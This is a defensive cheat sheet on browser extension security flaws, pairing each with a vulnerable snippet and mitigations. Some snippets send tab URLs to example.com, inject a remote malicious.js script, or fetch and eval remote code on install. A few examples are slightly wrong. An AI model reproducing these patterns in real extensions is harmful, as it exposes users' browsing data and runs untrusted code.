# Browser Extension Security Vulnerabilities Cheat Sheet

## 1. Permissions Overreach

### Vulnerability: Permissions Overreach

Browser extensions sometimes request more permissions than they actually need. This can grant them access to all tabs, browsing history, and even sensitive user data. If an extension is compromised, it could lead to serious privacy risks.

### Example: Permissions Overreach

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage"
  ]
}
```

### Mitigation: Permissions Overreach

Follow the Principle of Least Privilege (PoLP) and request only the permissions that are absolutely necessary. Use optional permissions whenever possible instead of granting full access upfront. Regularly audit and remove any permissions that are no longer needed.

## 2. Data Leakage

### Vulnerability: Data Leakage

Some extensions unintentionally expose user data by sending browsing activity or personal details to external servers without proper security measures.

### Example: Data Leakage

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    fetch('http://example.com/track', {
      method: 'POST',
      body: JSON.stringify({ URL: tab.URL })
    });
  }
});
```

### Mitigation: Data Leakage

Always use HTTPS for all communications to prevent data interception. Limit data collection and be transparent by clearly stating what data is collected in a Privacy Policy.Implement user consent mechanisms before collecting or sending any personal data.

## 3. Cross-Site Scripting (XSS)

### Vulnerability: Cross-Site Scripting (XSS)

If user input is not properly sanitized, attackers can inject malicious scripts into web pages, potentially stealing user data or performing unauthorized actions.

### Example: Cross-Site Scripting (XSS)

```javascript
let userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput; // No sanitization
```

### Mitigation: Cross-Site Scripting (XSS)

Implement Content Security Policy (CSP) to block inline scripts. Use libraries like DOMPurify to sanitize user input before displaying it. Avoid using innerHTML and instead use textContent to prevent execution of injected scripts.

## 4. Insecure Communication

### Vulnerability: Insecure Communication

Some extensions send sensitive data over unsecured HTTP connections, making it vulnerable to interception by attackers.

### Example: Insecure Communication

```javascript
fetch('http://example.com/api/data');
```

### Mitigation: Insecure Communication

Always use HTTPS for external communications to prevent data theft. Validate server responses before processing them to ensure data integrity.

## 5. Code Injection

### Vulnerability: Code Injection

An extension that dynamically loads scripts from an untrusted source can be exploited to inject and execute malicious code.

### Example: Code Injection

```javascript
let script = document.createElement('script');
script.src = 'http://example.com/malicious.js';
document.body.appendChild(script);
```

### Mitigation: Code Injection

Use CSP (Content Security Policy) to restrict script sources. For more details, refer to the [CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html). Avoid using eval() and innerHTML as they can execute malicious code. Prefer using extension messaging APIs instead of injecting scripts into web pages.

## 6. Malicious Updates

### Vulnerability: Malicious Updates

If an extension fetches updates from an untrusted server, an attacker could push malicious updates to all users.

### Example: Malicious Updates

```javascript
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // Unsafe!
});
```

### Mitigation: Malicious Updates

Sign extension updates with digital signatures to ensure authenticity. Instead of fetching updates within the extension, rely on updates from the extension marketplace.
See ["Don’t inject or incorporate remote scripts"](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices).
Implement integrity checks before executing any fetched code.

## 7. Third-Party Dependencies

### Vulnerability: Third-Party Dependencies

Using outdated or vulnerable third-party libraries in an extension can introduce security risks if those libraries have known exploits.

### Example: Third-Party Dependencies

```json
{
  "dependencies": {
    "vulnerable-lib": "1.0.0"
  }
}
```

### Mitigation: Third-Party Dependencies

Regularly audit third-party dependencies for security vulnerabilities. Use tools like npm audit or OWASP Dependency-Check to detect risks.Prefer actively maintained libraries with frequent security updates.

## 8. Lack of Content Security Policy (CSP)

### Vulnerability: Lack of Content Security Policy (CSP)

Without a strict CSP, attackers can inject scripts into an extension’s web pages, increasing the risk of cross-site scripting (XSS) attacks.

### Example: Lack of Content Security Policy (CSP)

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "content_security_policy": "default-src 'self'"
}
```

### Mitigation: Lack of Content Security Policy (CSP)

Define a strict CSP in the extension’s manifest.json file. Use nonce-based or hash-based policies to allow only trusted scripts. Block execution of inline scripts and restrict third-party content sources.

## 9. Insecure Storage

### Vulnerability: Insecure Storage

Storing sensitive data like authentication tokens in localStorage or other unsecured locations makes it easy for attackers to access.

### Example: Insecure Storage

```javascript
localStorage.setItem('token', 'my-secret-token'); // No encryption
```

### Mitigation: Insecure Storage

Store sensitive data in Chrome Storage API, which provides better security than localStorage.
Encrypt stored data before saving it locally.
Never hardcode API keys or credentials within the extension code.

## 10. Insufficient Privacy Controls

### Vulnerability: Insufficient Privacy Controls

If an extension does not clearly define how it collects and handles user data, it could lead to privacy violations and unauthorized data usage.

### Example: Insufficient Privacy Controls

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "description": "A cool extension with no privacy policy."
}
```

### Mitigation: Insufficient Privacy Controls

Implement a clear privacy policy that explains data collection practices. Allow users to opt out of data collection. Disclose data-sharing practices to comply with GDPR, CCPA, and other privacy regulations.

## Conclusion

By following these security best practices, developers can build safer browser extensions and protect users from privacy and security threats. Always prioritize least privilege, encryption, and secure coding principles when developing extensions.

🔹 References:
[Google Chrome Extension Security Guide](https://developer.chrome.com/docs/extensions/mv3/security/)  
[Mozilla Firefox Extension Security Best Practices](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices)
